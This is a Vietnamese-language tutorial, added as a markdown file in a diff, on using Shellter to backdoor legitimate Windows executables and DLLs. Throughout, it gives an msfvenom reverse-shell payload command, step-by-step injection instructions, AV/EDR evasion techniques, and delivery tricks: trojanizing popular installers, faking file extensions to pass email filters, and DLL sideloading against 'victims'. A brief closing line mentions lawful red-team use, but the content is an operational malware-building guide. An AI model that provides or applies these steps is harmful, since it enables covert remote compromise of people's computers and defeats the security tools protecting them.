@@ -1,0 +1,151 @@
+1. Shellter là gì?
+
+    Shellter là tool patch/obfuscate file PE (Portable Executable – exe/dll) trên Windows để:
+
+        Chèn payload (shellcode) vào file hợp pháp (ex: notepad.exe, calc.exe, cài đặt…)
+
+        Bypass AV/EDR nhờ kỹ thuật encode, random injection point, polymorphic
+
+        Tùy chọn chạy ở Auto mode (tự động chèn payload) hoặc Manual mode (tự chọn vị trí, stealth cao)
+
+        Hỗ trợ dynamic PE injection, stealth injection, custom shellcode, msfvenom, loader tự code
+
+        Không tạo file mới, mà sửa file hợp pháp thành file backdoor stealth
+
+2. Cài đặt Shellter
+A. Tải về (không cần cài đặt, portable)
+
+    Trang chủ: https://www.shellterproject.com/download/
+
+    File zip: Giải nén, chạy trên Windows (cmd, powershell, wine)
+
+    Trên Kali/Ubuntu: cài wine để chạy Shellter trên Linux.
+
+B. Chạy Shellter
+
+wine shellter.exe
+
+    Luôn chạy bằng quyền Admin nếu patch file hệ thống!
+
+3. Tạo payload (shellcode) với msfvenom
+
+    Trước khi dùng Shellter, tạo shellcode:
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shellcode.bin
+
+        -f raw: xuất shellcode raw
+
+        Có thể encode nhiều vòng: -e x86/shikata_ga_nai -i 5
+
+        Nên dùng payload dạng stageless:
+
+            windows/meterpreter/reverse_tcp
+
+            windows/shell_reverse_tcp
+
+        Không dùng shellcode size quá lớn!
+
+4. Patch file PE với Shellter (Auto Mode – dễ dùng nhất)
+A. Auto Mode – patch nhanh
+
+    Khởi động Shellter
+
+    shellter.exe
+
+    Chọn [A]uto mode
+
+    Nhập đường dẫn tới file PE hợp pháp (ex: notepad.exe)
+
+    Chọn [Y]es để enable Stealth Mode (giấu code, khó detect AV)
+
+    Chọn [N]o nếu muốn dùng shellcode ngoài (custom payload)
+
+    Chỉ định đường dẫn shellcode.bin (tạo bằng msfvenom)
+
+    Chờ patch xong, Shellter sẽ lưu đè lên file gốc hoặc xuất ra file mới
+
+B. Run file patch – nhận shell
+
+    Upload file đã patch lên target/victim, chạy, msfconsole/multi/handler sẽ nhận shell/meterpreter.
+
+5. Patch file PE nâng cao (Manual Mode – stealth chuyên sâu)
+A. Manual Mode – tùy chỉnh injection point
+
+    Chọn [M]anual mode
+
+    Chọn entrypoint cụ thể (Shellter sẽ gợi ý offset, hoặc tự chọn bằng địa chỉ)
+
+    Chọn stealth mode (enable/disable), enable debug log (optional)
+
+    Chèn shellcode custom hoặc msfvenom raw
+
+    Có thể chỉnh seed random, anti-emulation, anti-debug, control obfuscate
+
+B. Chain nhiều payload, multi-stage
+
+    Có thể patch thêm shellcode thứ 2, hoặc chain loader khác (donut, Cobalt Strike, Nim, Go loader...)
+
+6. Stealth & bypass AV/EDR mạnh
+
+    Shellter không tạo file mới, chỉ patch/obfuscate file gốc nên:
+
+        Dễ qua các signature AV
+
+        Random hóa injection point, encode, flow, API call để tránh bị pattern match
+
+    Enable Stealth mode luôn khi patch file real
+
+    Kết hợp encode nhiều vòng msfvenom, shellter sẽ obfuscate tiếp
+
+    Dùng file hợp pháp được sign/mã hóa/packed sẵn sẽ giảm tỷ lệ AV detect
+
+    Có thể patch file .dll để sideload DLL (DLL Hijacking/Living off the land attack)
+
+7. Một số trick & workflow mạnh với Shellter
+
+    Patch PE thuộc bộ cài, phần mềm phổ biến (adobe, notepad, chrome, winrar…) để bypass social engineering.
+
+    DLL sideload: Patch .dll hợp pháp, dùng kỹ thuật DLL hijack để thực thi shellcode trong process hợp pháp (thường AV bỏ qua).
+
+    Automation script: Dùng batch + shellter CLI để patch hàng loạt file với nhiều shellcode khác nhau.
+
+    Patch file rồi nén/đổi tên/giả extension để qua filter email/gmail/endpoint/AV.
+
+    Test file patch trên máy ảo clean trước khi deploy!
+
+8. Fix lỗi thường gặp
+Lỗi	Cách xử lý
+Patch lỗi “incompatible file”	Dùng PE chuẩn, không patch file đã pack/protect/obfuscate khác
+File patch chạy nhưng không kết nối	LHOST/LPORT sai, firewall, AV block shellcode, thử encode mạnh hơn
+AV detect payload	Encode nhiều vòng, enable stealth, thử file khác, dùng shellcode custom
+File không chạy	Không đúng arch, quyền admin, file gốc bị lỗi, patch nhầm file protected
+Patch xong file lỗi CRC/hash	Thử patch file khác, kiểm tra hash, patch lại từ đầu
+Không nhận được shell	Xem lại handler, NAT, port, check log shellter, kiểm tra shellcode đúng loại
+9. So sánh Shellter với các công cụ khác
+Tool	Ưu điểm Shellter	Khác biệt
+Shellter	Patch file PE cực stealth, bypass AV/EDR, random hóa, không tạo file mới	Chỉ support Windows PE, cần file hợp pháp sẵn
+Veil	Tạo loader evade AV, đa dạng script	Không patch file hợp pháp, AV detect cao hơn khi file mới
+Donut	Tạo shellcode .NET/PE cho loader/process hollowing	Không patch vào file PE sẵn, phải tự viết loader
+msfvenom	Tạo payload đa nền tảng, encode, nhiều định dạng	Dễ bị detect khi xuất file mới, không patch PE hợp pháp
+Nim/Go loader	Loader custom bypass AV tốt	Phải biết code, không patch file PE sẵn
+10. Tài liệu, link hữu ích
+
+    Shellter Project
+
+    Shellter Github
+
+    PayloadAllTheThings – AV Bypass
+
+    Hacktricks – AV Evasion
+
+    Veil Framework
+
+    Donut Loader
+
+Tóm tắt nhanh
+
+    Shellter: công cụ patch/obfuscate file PE (exe/dll) cực stealth cho pentest, Red Team, tạo file backdoor bypass AV/EDR mạnh, hỗ trợ msfvenom/custom shellcode, stealth mode, encode, automation, DLL sideload.
+
+    Nên chain msfvenom encode, test kỹ, phối hợp Veil/Donut/Shellter/Nim loader để đạt hiệu quả tối ưu.
+
+    Chỉ dùng lab/Red Team hợp pháp – test kỹ trên máy ảo sạch, hạn chế dùng cho mục đích xấu.
